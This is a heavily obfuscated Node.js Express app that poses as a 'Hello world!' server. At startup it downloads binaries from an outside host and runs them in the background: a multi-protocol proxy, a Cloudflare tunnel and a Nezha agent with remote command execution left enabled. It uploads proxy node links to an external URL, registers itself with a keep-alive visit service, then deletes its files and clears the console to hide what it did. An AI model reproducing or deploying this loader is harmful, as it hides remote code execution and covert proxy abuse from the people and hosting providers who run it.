const _0xb13bf0=_0x1137;(function(_0x457cda,_0x351fed){const _0x4c8d5b=_0x1137,_0x4b27ff=_0x457cda();while(!![]){try{const _0x5574b8=-parseInt(_0x4c8d5b(0x16c))/0x1*(parseInt(_0x4c8d5b(0x162))/0x2)+-parseInt(_0x4c8d5b(0x14a))/0x3*(parseInt(_0x4c8d5b(0x1b3))/0x4)+parseInt(_0x4c8d5b(0x149))/0x5+parseInt(_0x4c8d5b(0x177))/0x6*(parseInt(_0x4c8d5b(0x15e))/0x7)+parseInt(_0x4c8d5b(0x1f5))/0x8*(-parseInt(_0x4c8d5b(0x154))/0x9)+parseInt(_0x4c8d5b(0x1d1))/0xa*(-parseInt(_0x4c8d5b(0x1cc))/0xb)+parseInt(_0x4c8d5b(0x176))/0xc;if(_0x5574b8===_0x351fed)break;else _0x4b27ff['push'](_0x4b27ff['shift']());}catch(_0xf4765c){_0x4b27ff['push'](_0x4b27ff['shift']());}}}(_0xb612,0xbeb42));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0xb13bf0(0x159)),{promisify}=require(_0xb13bf0(0x1d5)),exec=promisify(require('child_process')[_0xb13bf0(0x1cd)]),{execSync}=require(_0xb13bf0(0x1b0)),UPLOAD_URL=process[_0xb13bf0(0x16b)][_0xb13bf0(0x1be)]||'',PROJECT_URL=process['env'][_0xb13bf0(0x17b)]||'',AUTO_ACCESS=process['env'][_0xb13bf0(0x188)]||![],FILE_PATH=process[_0xb13bf0(0x16b)][_0xb13bf0(0x1a1)]||_0xb13bf0(0x1a5),SUB_PATH=process[_0xb13bf0(0x16b)][_0xb13bf0(0x16f)]||'w/t/o',PORT=process[_0xb13bf0(0x16b)][_0xb13bf0(0x20a)]||process['env'][_0xb13bf0(0x1b1)]||0xbb8,UUID=process[_0xb13bf0(0x16b)]['UUID']||'9afd1229-b893-40c1-84dd-51e7ce204913',NEZHA_SERVER=process[_0xb13bf0(0x16b)][_0xb13bf0(0x1dd)]||'',NEZHA_PORT=process[_0xb13bf0(0x16b)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0xb13bf0(0x204)]||'',ARGO_DOMAIN=process[_0xb13bf0(0x16b)][_0xb13bf0(0x1e3)]||'',ARGO_AUTH=process[_0xb13bf0(0x16b)][_0xb13bf0(0x1a2)]||'',ARGO_PORT=process[_0xb13bf0(0x16b)][_0xb13bf0(0x1fd)]||0x1f41,CFIP=process['env'][_0xb13bf0(0x1e8)]||_0xb13bf0(0x1ab),CFPORT=process[_0xb13bf0(0x16b)][_0xb13bf0(0x1da)]||0x1bb,NAME=process['env']['NAME']||'';!fs[_0xb13bf0(0x19f)](FILE_PATH)?(fs[_0xb13bf0(0x181)](FILE_PATH),console[_0xb13bf0(0x1c5)](FILE_PATH+_0xb13bf0(0x172))):console[_0xb13bf0(0x1c5)](FILE_PATH+_0xb13bf0(0x1ac));function generateRandomName(){const _0x2fb8ff=_0xb13bf0,_0x13fcd2='abcdefghijklmnopqrstuvwxyz';let _0x23189e='';for(let _0x3630e4=0x0;_0x3630e4<0x6;_0x3630e4++){_0x23189e+=_0x13fcd2[_0x2fb8ff(0x178)](Math['floor'](Math[_0x2fb8ff(0x17e)]()*_0x13fcd2['length']));}return _0x23189e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xb13bf0(0x184)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0xb13bf0(0x184)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0xb13bf0(0x184)](FILE_PATH,_0xb13bf0(0x207)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0xb13bf0(0x184)](FILE_PATH,_0xb13bf0(0x189));function deleteNodes(){const _0x23eb80=_0xb13bf0;try{if(!UPLOAD_URL)return;if(!fs[_0x23eb80(0x19f)](subPath))return;let _0x1558c4;try{_0x1558c4=fs[_0x23eb80(0x196)](subPath,_0x23eb80(0x168));}catch{return null;}const _0x263a22=Buffer['from'](_0x1558c4,_0x23eb80(0x18a))[_0x23eb80(0x1f9)](_0x23eb80(0x168)),_0x100e68=_0x263a22[_0x23eb80(0x1ae)]('\x0a')['filter'](_0x4884c1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x23eb80(0x15d)](_0x4884c1));if(_0x100e68[_0x23eb80(0x171)]===0x0)return;return axios[_0x23eb80(0x1f4)](UPLOAD_URL+_0x23eb80(0x205),JSON[_0x23eb80(0x1bc)]({'nodes':_0x100e68}),{'headers':{'Content-Type':_0x23eb80(0x1d6)}})[_0x23eb80(0x19b)](_0x1b5819=>{return null;}),null;}catch(_0x26ea95){return null;}}function cleanupOldFiles(){const _0x4f033c=_0xb13bf0;try{const _0x33ba4a=fs[_0x4f033c(0x1a8)](FILE_PATH);_0x33ba4a['forEach'](_0x5bec96=>{const _0x21dc3f=_0x4f033c,_0x37e6c6=path['join'](FILE_PATH,_0x5bec96);try{const _0x5e1c43=fs[_0x21dc3f(0x201)](_0x37e6c6);_0x5e1c43[_0x21dc3f(0x165)]()&&fs['unlinkSync'](_0x37e6c6);}catch(_0x2f1d91){}});}catch(_0x54a2ae){}}app[_0xb13bf0(0x19a)]('/',function(_0x3100f4,_0x313c03){const _0x593f8d=_0xb13bf0;_0x313c03[_0x593f8d(0x17d)](_0x593f8d(0x14e));});async function generateConfig(){const _0x1751f0=_0xb13bf0,_0xe0dd50={'log':{'access':_0x1751f0(0x1c6),'error':_0x1751f0(0x1c6),'loglevel':_0x1751f0(0x15b)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1751f0(0x15a),'settings':{'clients':[{'id':UUID,'flow':_0x1751f0(0x1a7)}],'decryption':_0x1751f0(0x15b),'fallbacks':[{'dest':0xbb9},{'path':_0x1751f0(0x1e4),'dest':0xbba},{'path':_0x1751f0(0x1d3),'dest':0xbbb},{'path':_0x1751f0(0x166),'dest':0xbbc}]},'streamSettings':{'network':_0x1751f0(0x1b8)}},{'port':0xbb9,'listen':_0x1751f0(0x16e),'protocol':_0x1751f0(0x15a),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x1751f0(0x1b8),'security':_0x1751f0(0x15b)}},{'port':0xbba,'listen':_0x1751f0(0x16e),'protocol':_0x1751f0(0x15a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x1751f0(0x1e4)}},'sniffing':{'enabled':!![],'destOverride':[_0x1751f0(0x145),_0x1751f0(0x1c1),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1751f0(0x16e),'protocol':_0x1751f0(0x158),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1751f0(0x1c1),_0x1751f0(0x152)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1751f0(0x16e),'protocol':_0x1751f0(0x147),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x1751f0(0x166)}},'sniffing':{'enabled':!![],'destOverride':[_0x1751f0(0x145),_0x1751f0(0x1c1),_0x1751f0(0x152)],'metadataOnly':![]}}],'dns':{'servers':[_0x1751f0(0x1fb)]},'outbounds':[{'protocol':_0x1751f0(0x1f8),'tag':_0x1751f0(0x15f)},{'protocol':_0x1751f0(0x191),'tag':_0x1751f0(0x1ad)}]};fs[_0x1751f0(0x194)](path[_0x1751f0(0x184)](FILE_PATH,_0x1751f0(0x189)),JSON[_0x1751f0(0x1bc)](_0xe0dd50,null,0x2));}function getSystemArchitecture(){const _0x19d3ca=_0xb13bf0,_0x17b5af=os[_0x19d3ca(0x173)]();return _0x17b5af===_0x19d3ca(0x156)||_0x17b5af===_0x19d3ca(0x1af)||_0x17b5af===_0x19d3ca(0x18b)?_0x19d3ca(0x156):_0x19d3ca(0x18e);}function downloadFile(_0x479088,_0x415e54,_0x272c74){const _0x32f26b=_0xb13bf0,_0xbe4ede=_0x479088;!fs['existsSync'](FILE_PATH)&&fs[_0x32f26b(0x181)](FILE_PATH,{'recursive':!![]});const _0x1f6a95=fs[_0x32f26b(0x1a4)](_0xbe4ede);axios({'method':'get','url':_0x415e54,'responseType':_0x32f26b(0x1fc)})[_0x32f26b(0x1aa)](_0x152c70=>{const _0x4ab38b=_0x32f26b;_0x152c70[_0x4ab38b(0x1de)]['pipe'](_0x1f6a95),_0x1f6a95['on'](_0x4ab38b(0x1e1),()=>{const _0x424589=_0x4ab38b;_0x1f6a95[_0x424589(0x15c)](),console[_0x424589(0x1c5)](_0x424589(0x169)+path[_0x424589(0x202)](_0xbe4ede)+_0x424589(0x1f7)),_0x272c74(null,_0xbe4ede);}),_0x1f6a95['on'](_0x4ab38b(0x1c9),_0x2b2a6d=>{const _0x47e8e7=_0x4ab38b;fs['unlink'](_0xbe4ede,()=>{});const _0x1298a8=_0x47e8e7(0x169)+path[_0x47e8e7(0x202)](_0xbe4ede)+_0x47e8e7(0x1e0)+_0x2b2a6d['message'];console[_0x47e8e7(0x1c9)](_0x1298a8),_0x272c74(_0x1298a8);});})[_0x32f26b(0x19b)](_0x2d09fd=>{const _0x657000=_0x32f26b,_0x209163='Download\x20'+path[_0x657000(0x202)](_0xbe4ede)+_0x657000(0x1e0)+_0x2d09fd[_0x657000(0x1cf)];console[_0x657000(0x1c9)](_0x209163),_0x272c74(_0x209163);});}function _0x1137(_0x3e6aa8,_0x5556ba){const _0xb6122c=_0xb612();return _0x1137=function(_0x1137e0,_0x4c4bb2){_0x1137e0=_0x1137e0-0x145;let _0x2e5a09=_0xb6122c[_0x1137e0];return _0x2e5a09;},_0x1137(_0x3e6aa8,_0x5556ba);}async function downloadFilesAndRun(){const _0x27c970=_0xb13bf0,_0x179b21=getSystemArchitecture(),_0x37f27e=getFilesForArchitecture(_0x179b21);if(_0x37f27e['length']===0x0){console[_0x27c970(0x1c5)](_0x27c970(0x1d4));return;}const _0xb29f10=_0x37f27e['map'](_0x2b1cca=>{return new Promise((_0x2527c5,_0x5c57d0)=>{const _0xeea87a=_0x1137;downloadFile(_0x2b1cca[_0xeea87a(0x1bd)],_0x2b1cca['fileUrl'],(_0x34652b,_0x4a2a7a)=>{_0x34652b?_0x5c57d0(_0x34652b):_0x2527c5(_0x4a2a7a);});});});try{await Promise[_0x27c970(0x146)](_0xb29f10);}catch(_0x5a8634){console[_0x27c970(0x1c9)](_0x27c970(0x1dc),_0x5a8634);return;}function _0x33a8da(_0x4daf66){const _0x43f2cd=_0x27c970,_0x4ced56=0x1fd;_0x4daf66[_0x43f2cd(0x164)](_0x1fa119=>{const _0x4973ca=_0x43f2cd;fs[_0x4973ca(0x19f)](_0x1fa119)&&fs['chmod'](_0x1fa119,_0x4ced56,_0x5f4d37=>{const _0xe2cbb2=_0x4973ca;_0x5f4d37?console['error']('Empowerment\x20failed\x20for\x20'+_0x1fa119+':\x20'+_0x5f4d37):console['log'](_0xe2cbb2(0x200)+_0x1fa119+':\x20'+_0x4ced56[_0xe2cbb2(0x1f9)](0x8));});});}const _0x5a3959=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x33a8da(_0x5a3959);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x10f364=NEZHA_SERVER[_0x27c970(0x1b7)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x1c12d7=new Set([_0x27c970(0x17c),_0x27c970(0x1ba),_0x27c970(0x1c8),_0x27c970(0x198),_0x27c970(0x1c0),'2053']),_0x513fc6=_0x1c12d7[_0x27c970(0x1ca)](_0x10f364)?_0x27c970(0x174):'false',_0x52c6b6='\x0aclient_secret:\x20'+NEZHA_KEY+_0x27c970(0x18c)+NEZHA_SERVER+_0x27c970(0x153)+_0x513fc6+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x27c970(0x194)](path[_0x27c970(0x184)](FILE_PATH,_0x27c970(0x1fe)),_0x52c6b6);const _0x43ca92=_0x27c970(0x182)+phpPath+_0x27c970(0x18f)+FILE_PATH+_0x27c970(0x1a6);try{await exec(_0x43ca92),console[_0x27c970(0x1c5)](phpName+_0x27c970(0x208)),await new Promise(_0x5cca1a=>setTimeout(_0x5cca1a,0x3e8));}catch(_0x19155b){console[_0x27c970(0x1c9)]('php\x20running\x20error:\x20'+_0x19155b);}}else{let _0x48f0ad='';const _0x2e4202=[_0x27c970(0x17c),_0x27c970(0x1ba),_0x27c970(0x1c8),_0x27c970(0x198),_0x27c970(0x1c0),_0x27c970(0x1a0)];_0x2e4202[_0x27c970(0x1b7)](NEZHA_PORT)&&(_0x48f0ad=_0x27c970(0x161));const _0xd81870=_0x27c970(0x182)+npmPath+_0x27c970(0x1ec)+NEZHA_SERVER+':'+NEZHA_PORT+_0x27c970(0x1ed)+NEZHA_KEY+'\x20'+_0x48f0ad+_0x27c970(0x167);try{await exec(_0xd81870),console[_0x27c970(0x1c5)](npmName+'\x20is\x20running'),await new Promise(_0x35fd40=>setTimeout(_0x35fd40,0x3e8));}catch(_0x552359){console[_0x27c970(0x1c9)](_0x27c970(0x183)+_0x552359);}}}else console[_0x27c970(0x1c5)](_0x27c970(0x170));const _0x15931f=_0x27c970(0x182)+webPath+_0x27c970(0x14f)+FILE_PATH+_0x27c970(0x1ea);try{await exec(_0x15931f),console[_0x27c970(0x1c5)](webName+_0x27c970(0x208)),await new Promise(_0x2cb7c3=>setTimeout(_0x2cb7c3,0x3e8));}catch(_0x4929b4){console[_0x27c970(0x1c9)](_0x27c970(0x151)+_0x4929b4);}if(fs[_0x27c970(0x19f)](botPath)){let _0x57dffd;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x57dffd=_0x27c970(0x195)+ARGO_AUTH;else ARGO_AUTH[_0x27c970(0x1e2)](/TunnelSecret/)?_0x57dffd=_0x27c970(0x1e6)+FILE_PATH+'/tunnel.yml\x20run':_0x57dffd=_0x27c970(0x187)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x27c970(0x182)+botPath+'\x20'+_0x57dffd+'\x20>/dev/null\x202>&1\x20&'),console[_0x27c970(0x1c5)](botName+_0x27c970(0x208)),await new Promise(_0x305bf0=>setTimeout(_0x305bf0,0x7d0));}catch(_0x52bbbf){console['error'](_0x27c970(0x1ee)+_0x52bbbf);}}await new Promise(_0x2effb1=>setTimeout(_0x2effb1,0x1388));}function getFilesForArchitecture(_0x562b6c){const _0x45067f=_0xb13bf0;let _0x148b80;_0x562b6c==='arm'?_0x148b80=[{'fileName':webPath,'fileUrl':_0x45067f(0x1ef)},{'fileName':botPath,'fileUrl':_0x45067f(0x1df)}]:_0x148b80=[{'fileName':webPath,'fileUrl':_0x45067f(0x1b4)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xc09b85=_0x562b6c===_0x45067f(0x156)?'https://arm64.ssss.nyc.mn/agent':_0x45067f(0x17a);_0x148b80[_0x45067f(0x1eb)]({'fileName':npmPath,'fileUrl':_0xc09b85});}else{const _0x30cf6d=_0x562b6c===_0x45067f(0x156)?_0x45067f(0x1bf):_0x45067f(0x193);_0x148b80[_0x45067f(0x1eb)]({'fileName':phpPath,'fileUrl':_0x30cf6d});}}return _0x148b80;}function argoType(){const _0x3ccfd7=_0xb13bf0;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x3ccfd7(0x1b7)]('TunnelSecret')){fs[_0x3ccfd7(0x194)](path[_0x3ccfd7(0x184)](FILE_PATH,_0x3ccfd7(0x179)),ARGO_AUTH);const _0x27d92e=_0x3ccfd7(0x1bb)+ARGO_AUTH[_0x3ccfd7(0x1ae)]('\x22')[0xb]+_0x3ccfd7(0x16d)+path[_0x3ccfd7(0x184)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x3ccfd7(0x14b)+ARGO_PORT+_0x3ccfd7(0x1cb);fs[_0x3ccfd7(0x194)](path['join'](FILE_PATH,_0x3ccfd7(0x1c3)),_0x27d92e);}else console[_0x3ccfd7(0x1c5)](_0x3ccfd7(0x17f));}argoType();async function extractDomains(){const _0x338356=_0xb13bf0;let _0x9b532;if(ARGO_AUTH&&ARGO_DOMAIN)_0x9b532=ARGO_DOMAIN,console['log'](_0x338356(0x186),_0x9b532),await _0x3f127f(_0x9b532);else try{const _0x5c464b=fs[_0x338356(0x196)](path[_0x338356(0x184)](FILE_PATH,'boot.log'),_0x338356(0x168)),_0x125aaf=_0x5c464b[_0x338356(0x1ae)]('\x0a'),_0x285e33=[];_0x125aaf[_0x338356(0x164)](_0x481165=>{const _0x267fe0=_0x338356,_0x573cc4=_0x481165[_0x267fe0(0x1e2)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x573cc4){const _0x59efd9=_0x573cc4[0x1];_0x285e33[_0x267fe0(0x1e5)](_0x59efd9);}});if(_0x285e33[_0x338356(0x171)]>0x0)_0x9b532=_0x285e33[0x0],console[_0x338356(0x1c5)](_0x338356(0x1b2),_0x9b532),await _0x3f127f(_0x9b532);else{console[_0x338356(0x1c5)](_0x338356(0x19c)),fs[_0x338356(0x148)](path['join'](FILE_PATH,_0x338356(0x1d2)));async function _0x3955cc(){const _0x146328=_0x338356;try{process['platform']==='win32'?await exec(_0x146328(0x1d8)+botName+_0x146328(0x190)):await exec(_0x146328(0x1c2)+botName['charAt'](0x0)+']'+botName[_0x146328(0x1a3)](0x1)+_0x146328(0x1c7));}catch(_0x4b00f1){}}_0x3955cc(),await new Promise(_0x4be4bc=>setTimeout(_0x4be4bc,0xbb8));const _0x4dc4f1=_0x338356(0x187)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x4dc4f1+_0x338356(0x1f1)),console[_0x338356(0x1c5)](botName+_0x338356(0x208)),await new Promise(_0x6572ce=>setTimeout(_0x6572ce,0xbb8)),await extractDomains();}catch(_0x1e1cdf){console[_0x338356(0x1c9)](_0x338356(0x1ee)+_0x1e1cdf);}}}catch(_0x221e62){console[_0x338356(0x1c9)](_0x338356(0x1e7),_0x221e62);}async function _0x3f127f(_0x55b11){const _0x353c9a=_0x338356,_0x520e73=execSync(_0x353c9a(0x1e9),{'encoding':_0x353c9a(0x168)}),_0x49f307=_0x520e73[_0x353c9a(0x1f6)](),_0x2b9731=NAME?NAME+'-'+_0x49f307:_0x49f307;return new Promise(_0x47f33c=>{setTimeout(()=>{const _0xa6db0b=_0x1137,_0x340a01={'v':'2','ps':''+_0x2b9731,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xa6db0b(0x15b),'net':'ws','type':_0xa6db0b(0x15b),'host':_0x55b11,'path':_0xa6db0b(0x175),'tls':_0xa6db0b(0x1c1),'sni':_0x55b11,'alpn':'','fp':_0xa6db0b(0x1f2)},_0x14e5cf=_0xa6db0b(0x1d9)+UUID+'@'+CFIP+':'+CFPORT+_0xa6db0b(0x1c4)+_0x55b11+_0xa6db0b(0x1fa)+_0x55b11+_0xa6db0b(0x1db)+_0x2b9731+_0xa6db0b(0x1b6)+Buffer['from'](JSON[_0xa6db0b(0x1bc)](_0x340a01))[_0xa6db0b(0x1f9)](_0xa6db0b(0x18a))+_0xa6db0b(0x160)+UUID+'@'+CFIP+':'+CFPORT+_0xa6db0b(0x1f0)+_0x55b11+_0xa6db0b(0x1fa)+_0x55b11+_0xa6db0b(0x192)+_0x2b9731+_0xa6db0b(0x14c);console['log'](Buffer[_0xa6db0b(0x203)](_0x14e5cf)[_0xa6db0b(0x1f9)](_0xa6db0b(0x18a))),fs[_0xa6db0b(0x194)](subPath,Buffer[_0xa6db0b(0x203)](_0x14e5cf)[_0xa6db0b(0x1f9)](_0xa6db0b(0x18a))),console[_0xa6db0b(0x1c5)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0xa6db0b(0x19a)]('/'+SUB_PATH,(_0x40f36f,_0x5a31b6)=>{const _0x4a1abc=_0xa6db0b,_0x17e8f5=Buffer[_0x4a1abc(0x203)](_0x14e5cf)[_0x4a1abc(0x1f9)]('base64');_0x5a31b6[_0x4a1abc(0x1ce)](_0x4a1abc(0x19d),_0x4a1abc(0x1ff)),_0x5a31b6[_0x4a1abc(0x17d)](_0x17e8f5);}),_0x47f33c(_0x14e5cf);},0x7d0);});}}async function uploadNodes(){const _0x1b5fbc=_0xb13bf0;if(UPLOAD_URL&&PROJECT_URL){const _0x4aeb99=PROJECT_URL+'/'+SUB_PATH,_0x27572b={'subscription':[_0x4aeb99]};try{const _0x49e4e3=await axios[_0x1b5fbc(0x1f4)](UPLOAD_URL+_0x1b5fbc(0x180),_0x27572b,{'headers':{'Content-Type':_0x1b5fbc(0x1d6)}});return _0x49e4e3&&_0x49e4e3['status']===0xc8?(console[_0x1b5fbc(0x1c5)](_0x1b5fbc(0x150)),_0x49e4e3):null;}catch(_0x11da93){if(_0x11da93[_0x1b5fbc(0x1a9)]){if(_0x11da93['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1b5fbc(0x19f)](listPath))return;const _0x2cc3f0=fs[_0x1b5fbc(0x196)](listPath,'utf-8'),_0x55a413=_0x2cc3f0[_0x1b5fbc(0x1ae)]('\x0a')[_0x1b5fbc(0x206)](_0x4b45f2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1b5fbc(0x15d)](_0x4b45f2));if(_0x55a413[_0x1b5fbc(0x171)]===0x0)return;const _0x19db32=JSON[_0x1b5fbc(0x1bc)]({'nodes':_0x55a413});try{const _0x2261b8=await axios[_0x1b5fbc(0x1f4)](UPLOAD_URL+_0x1b5fbc(0x157),_0x19db32,{'headers':{'Content-Type':_0x1b5fbc(0x1d6)}});return _0x2261b8&&_0x2261b8[_0x1b5fbc(0x163)]===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x2261b8):null;}catch(_0x306453){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x72a58c=_0x1137,_0x57c2b0=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x57c2b0[_0x72a58c(0x1e5)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x57c2b0['push'](phpPath);process['platform']===_0x72a58c(0x185)?exec(_0x72a58c(0x16a)+_0x57c2b0[_0x72a58c(0x184)]('\x20')+_0x72a58c(0x19e),_0x1605e7=>{const _0x5e5e5b=_0x72a58c;console[_0x5e5e5b(0x1d0)](),console[_0x5e5e5b(0x1c5)](_0x5e5e5b(0x199)),console[_0x5e5e5b(0x1c5)](_0x5e5e5b(0x18d));}):exec(_0x72a58c(0x197)+_0x57c2b0[_0x72a58c(0x184)]('\x20')+_0x72a58c(0x209),_0x46c4ed=>{const _0x1f0e34=_0x72a58c;console[_0x1f0e34(0x1d0)](),console['log']('App\x20is\x20running'),console[_0x1f0e34(0x1c5)](_0x1f0e34(0x18d));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1778bf=_0xb13bf0;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1778bf(0x1c5)](_0x1778bf(0x14d));return;}try{const _0x30ccfe=await axios[_0x1778bf(0x1f4)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x1778bf(0x1c5)](_0x1778bf(0x1d7)),_0x30ccfe;}catch(_0x5dfe75){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x5dfe75['message']),null;}}async function startserver(){const _0x5b032b=_0xb13bf0;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3042e0){console[_0x5b032b(0x1c9)](_0x5b032b(0x155),_0x3042e0);}}startserver()['catch'](_0x41066d=>{const _0x72c79a=_0xb13bf0;console[_0x72c79a(0x1c9)](_0x72c79a(0x1f3),_0x41066d);}),app[_0xb13bf0(0x1b9)](PORT,()=>console[_0xb13bf0(0x1c5)](_0xb13bf0(0x1b5)+PORT+'!'));function _0xb612(){const _0x40c4e6=['--tls','366sPeyAX','status','forEach','isFile','/trojan-argo','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','utf-8','Download\x20','del\x20/f\x20/q\x20','env','7761XkRFuf','\x0a\x20\x20credentials-file:\x20','127.0.0.1','SUB_PATH','NEZHA\x20variable\x20is\x20empty,skip\x20running','length','\x20is\x20created','arch','true','/vmess-argo?ed=2560','27656196sSfVtf','18wdhXbA','charAt','tunnel.json','https://amd64.ssss.nyc.mn/agent','PROJECT_URL','443','send','random','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/api/add-subscriptions','mkdirSync','nohup\x20','npm\x20running\x20error:\x20','join','win32','ARGO_DOMAIN:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','AUTO_ACCESS','config.json','base64','aarch64','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','amd','\x20-c\x20\x22','.exe\x20>\x20nul\x202>&1','blackhole','&path=%2Ftrojan-argo%3Fed%3D2560#','https://amd64.ssss.nyc.mn/v1','writeFileSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','readFileSync','rm\x20-rf\x20','2087','App\x20is\x20running','get','catch','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Content-Type','\x20>\x20nul\x202>&1','existsSync','2053','FILE_PATH','ARGO_AUTH','substring','createWriteStream','./tmp','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','xtls-rprx-vision','readdirSync','response','then','cdns.doon.eu.org','\x20already\x20exists','block','split','arm64','child_process','PORT','ArgoDomain:','44QkZQue','https://amd64.ssss.nyc.mn/web','http\x20server\x20is\x20running\x20on\x20port:','\x0a\x20\x20\x0avmess://','includes','tcp','listen','8443','\x0a\x20\x20tunnel:\x20','stringify','fileName','UPLOAD_URL','https://arm64.ssss.nyc.mn/v1','2083','tls','pkill\x20-f\x20\x22[','tunnel.yml','?encryption=none&security=tls&sni=','log','/dev/null','\x22\x20>\x20/dev/null\x202>&1','2096','error','has','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','11VClkRM','exec','set','message','clear','9486160lOsfKb','boot.log','/vmess-argo','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','util','application/json','automatic\x20access\x20task\x20added\x20successfully','taskkill\x20/f\x20/im\x20','\x0avless://','CFPORT','&path=%2Fvless-argo%3Fed%3D2560#','Error\x20downloading\x20files:','NEZHA_SERVER','data','https://arm64.ssss.nyc.mn/bot','\x20failed:\x20','finish','match','ARGO_DOMAIN','/vless-argo','push','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Error\x20reading\x20boot.log:','CFIP','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','/config.json\x20>/dev/null\x202>&1\x20&','unshift','\x20-s\x20','\x20-p\x20','Error\x20executing\x20command:\x20','https://arm64.ssss.nyc.mn/web','?security=tls&sni=','\x20>/dev/null\x202>&1\x20&','firefox','Unhandled\x20error\x20in\x20startserver:','post','3263192byJnaQ','trim','\x20successfully','freedom','toString','&fp=firefox&type=ws&host=','https+local://8.8.8.8/dns-query','stream','ARGO_PORT','config.yaml','text/plain;\x20charset=utf-8','Empowerment\x20success\x20for\x20','statSync','basename','from','NEZHA_KEY','/api/delete-nodes','filter','list.txt','\x20is\x20running','\x20>/dev/null\x202>&1','SERVER_PORT','http','all','trojan','unlinkSync','7123715euLtwu','250230SqjXgf','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0a\x20\x20\x20\x20','Skipping\x20adding\x20automatic\x20access\x20task','Hello\x20world!','\x20-c\x20','Subscription\x20uploaded\x20successfully','web\x20running\x20error:\x20','quic','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','27TCtXBL','Error\x20in\x20startserver:','arm','/api/add-nodes','vmess','path','vless','none','close','test','3644158aIMXBt','direct','\x0a\x20\x20\x0atrojan://'];_0xb612=function(){return _0x40c4e6;};return _0xb612();}
